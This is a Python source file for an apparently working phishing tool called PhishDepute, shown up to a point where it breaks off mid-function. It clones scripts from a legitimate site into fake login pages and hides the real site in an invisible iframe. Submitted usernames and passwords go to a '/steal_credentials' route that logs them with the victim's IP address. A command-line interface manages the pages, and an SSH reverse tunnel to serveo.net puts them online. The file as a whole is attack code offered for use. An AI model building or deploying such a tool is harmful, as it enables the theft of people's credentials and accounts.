
banner = """
███████████  █████       ███          █████      ██████████                                  █████            
░░███░░░░░███░░███       ░░░          ░░███      ░░███░░░░███                                ░░███             
 ░███    ░███ ░███████   ████   █████  ░███████   ░███   ░░███  ██████  ████████  █████ ████ ███████    ██████ 
 ░██████████  ░███░░███ ░░███  ███░░   ░███░░███  ░███    ░███ ███░░███░░███░░███░░███ ░███ ░░░███░    ███░░███
 ░███░░░░░░   ░███ ░███  ░███ ░░█████  ░███ ░███  ░███    ░███░███████  ░███ ░███ ░███ ░███   ░███    ░███████ 
 ░███         ░███ ░███  ░███  ░░░░███ ░███ ░███  ░███    ███ ░███░░░   ░███ ░███ ░███ ░███   ░███ ███░███░░░  
 █████        ████ █████ █████ ██████  ████ █████ ██████████  ░░██████  ░███████  ░░████████  ░░█████ ░░██████ 
░░░░░        ░░░░ ░░░░░ ░░░░░ ░░░░░░  ░░░░ ░░░░░ ░░░░░░░░░░    ░░░░░░   ░███░░░    ░░░░░░░░    ░░░░░   ░░░░░░  
                                                                        ░███                                   
                                                                        █████                                  
                                                                       ░░░░░                                   
"""
print(banner)

import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from flask import Flask, request, redirect, render_template_string
import click
import subprocess

app = Flask(__name__)

# Directory to store phishing pages and stolen data
PHISHING_PAGES_DIR = 'phishing_pages'
LOG_DIR = 'logs'
LOG_FILE = os.path.join(LOG_DIR, 'stolen_data.txt')

# Serveo settings
SERVEO_URL = 'https://your-serveo-url.serveo.net'  # Replace with your Serveo URL

# Ensure directories exist
if not os.path.exists(PHISHING_PAGES_DIR):
    os.makedirs(PHISHING_PAGES_DIR)

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Function to copy script content from a legitimate URL
def copy_page_script(url):
    response = requests.get(url)
    response.raise_for_status()

    soup = BeautifulSoup(response.content, 'html.parser')
    scripts = soup.find_all('script')

    script_content = ""
    for script in scripts:
        if script.string:
            script_content += script.string + "\n"
        elif script.get('src'):
            script_url = script.get('src')
            if not script_url.startswith('http'):
                script_url = urljoin(url, script_url)
            script_response = requests.get(script_url)
            script_response.raise_for_status()
            script_content += script_response.text + "\n"

    return script_content

# Function to generate phishing page HTML
def generate_phishing_page(legitimate_url, phishing_page_name):
    legitimate_scripts = copy_page_script(legitimate_url)

    phishing_page_html = f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{phishing_page_name}</title>
        <style>
            iframe {{
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                border: none;
                opacity: 0; /* Make it invisible */
            }}
        </style>
        <!-- Embedding legitimate scripts -->
        {legitimate_scripts}
    </head>
    <body>
        <h1>{phishing_page_name}</h1>
        <div class="login-container">
            <h2>Login Form</h2>
            <form action="{SERVEO_URL}/steal_credentials" method="post">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username"><br><br>
                <label for="password">Password:</label>
                <input type="password" id="password" name="password"><br><br>
                <input type="submit" value="Login">
            </form>
        </div>

        <!-- Hidden iframe to load the legitimate site -->
        <iframe src="{legitimate_url}"></iframe>
    </body>
    </html>
    '''
    
    # Save phishing page to file
    phishing_page_path = os.path.join(PHISHING_PAGES_DIR, f'{phishing_page_name}.html')
    with open(phishing_page_path, 'w') as f:
        f.write(phishing_page_html)
    
    return phishing_page_path

# Function to list available phishing pages
def list_phishing_pages():
    phishing_pages = os.listdir(PHISHING_PAGES_DIR)
    return phishing_pages

# Function to delete a phishing page
def delete_phishing_page(phishing_page_name):
    phishing_page_path = os.path.join(PHISHING_PAGES_DIR, f'{phishing_page_name}.html')
    if os.path.exists(phishing_page_path):
        os.remove(phishing_page_path)
        return True
    return False

# Function to rename a phishing page
def rename_phishing_page(old_name, new_name):
    old_path = os.path.join(PHISHING_PAGES_DIR, f'{old_name}.html')
    new_path = os.path.join(PHISHING_PAGES_DIR, f'{new_name}.html')
    if os.path.exists(old_path):
        os.rename(old_path, new_path)
        return True
    return False

# Function to log stolen credentials and IP address
def log_stolen_data(username, password, ip_address):
    with open(LOG_FILE, 'a') as f:
        f.write(f"IP: {ip_address}, Username: {username}, Password: {password}\n")

# Flask routes
@app.route('/')
def serve_phishing_page():
    page_name = request.args.get('page')
    if page_name:
        page_path = os.path.join(PHISHING_PAGES_DIR, f'{page_name}.html')
        if os.path.exists(page_path):
            with open(page_path, 'r') as file:
                return render_template_string(file.read())
    return "Phishing page not found", 404

@app.route('/steal_credentials', methods=['POST'])
def steal_credentials():
    username = request.form['username']
    password = request.form['password']
    ip_address = request.remote_addr
    log_stolen_data(username, password, ip_address)
    print(f"Stolen credentials: IP - {ip_address}, Username - {username}, Password - {password}")
    return redirect(request.url)

# Function to start Serveo
def start_serveo():
    try:
        subprocess.Popen(['ssh', '-R', '80:localhost:5000', 'serveo.net'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        click.echo("Serveo tunnel started. Your phishing pages are now accessible via Serveo.")
        click.echo("Ctrl+C to stop Serveo when done.")
    except Exception as e:
        click.echo(f"Error starting Serveo tunnel: {e}")

# Function to stop Serveo
def stop_serveo():
    try:
        subprocess.run(['pkill', '-f', 'ssh -R 80:localhost:5000 serveo.net'], check=True)
        click.echo("Serveo tunnel stopped.")
    except Exception as e:
        click.echo(f"Error stopping Serveo tunnel: {e}")

# CLI commands using Click
@click.group()
def cli():
    """Phishing Tool Command Line Interface"""
    if not os.path.exists(PHISHING_PAGES_DIR):
        os.makedirs(PHISHING_PAGES_DIR)

@cli.command()
@click.option('--url', prompt='Enter the legitimate URL', help='URL of the legitimate site to copy scripts from')
@click.option('--name', prompt='Enter the phishing page name', help='Name of the phishing page')
def create(url, name):
    """Create a new phishing page."""
    phishing_page_path = os.path.join(PHISHING_PAGES_DIR, f'{name}.html')
    if os.path.exists(phishing_page_path):
        click.echo(f"Phishing page with name '{name}' already exists. Choose a different name.")
        return
    try:
        phishing_page_file = generate_phishing_page(url, name)
        click.echo(f"Phishing page '{name}' created successfully: {phishing_page_file}")
    except Exception as e:
        click.echo(f"Error creating phishing page: {e}")

@cli.command()
def list():
    """List all available phishing pages."""
    phishing_pages = list_phishing_pages()
    if phishing_pages:
        click.echo("Available phishing pages:")
        for index, page in enumerate(phishing_pages):
            click.echo(f"{index + 1}. {page.replace('.html', '')}")
    else:
        click.echo("No phishing pages found.")

@cli.command()
@click.argument('name')
def delete(name):
    """Delete a phishing page by name."""
    try:
        if delete_phishing_page(name):
            click.echo(f"Phishing page '{name}' deleted successfully.")
        else:
            click.echo(f"Phishing page '{name}' not found.")
    except Exception as e:
        click.echo(f"Error deleting phishing page: {e}")

@cli.command()
@click.argument('old_name')
@click.option('--new_name', prompt='Enter the new name', help='New name for the phishing page')
def rename(old_name, new_name):
    """Rename a phishing page."""
    try:
        if os.path.exists(os.path.join(PHISHING_PAGES_DIR, f'{new_name}.html')):
            click.echo(f"Phishing page with name '{new_name}' already exists. Choose a different name.")
            return
        if rename_phishing_page(old_name, new_name):
            click.echo(f"Phishing page '{old_name}' renamed to '{new_name}' successfully.")
        else:
            click.echo(f"Phishing page '{old_name}' not found.")
    except Exception as e:
        click.echo(f"Error renaming phishing page: {e}")

@cli.command()
def view():
    """View the content of a phishing page."""
    phishing_pages = list_phishing_pages()
    if not phishing_pages:
        click.echo

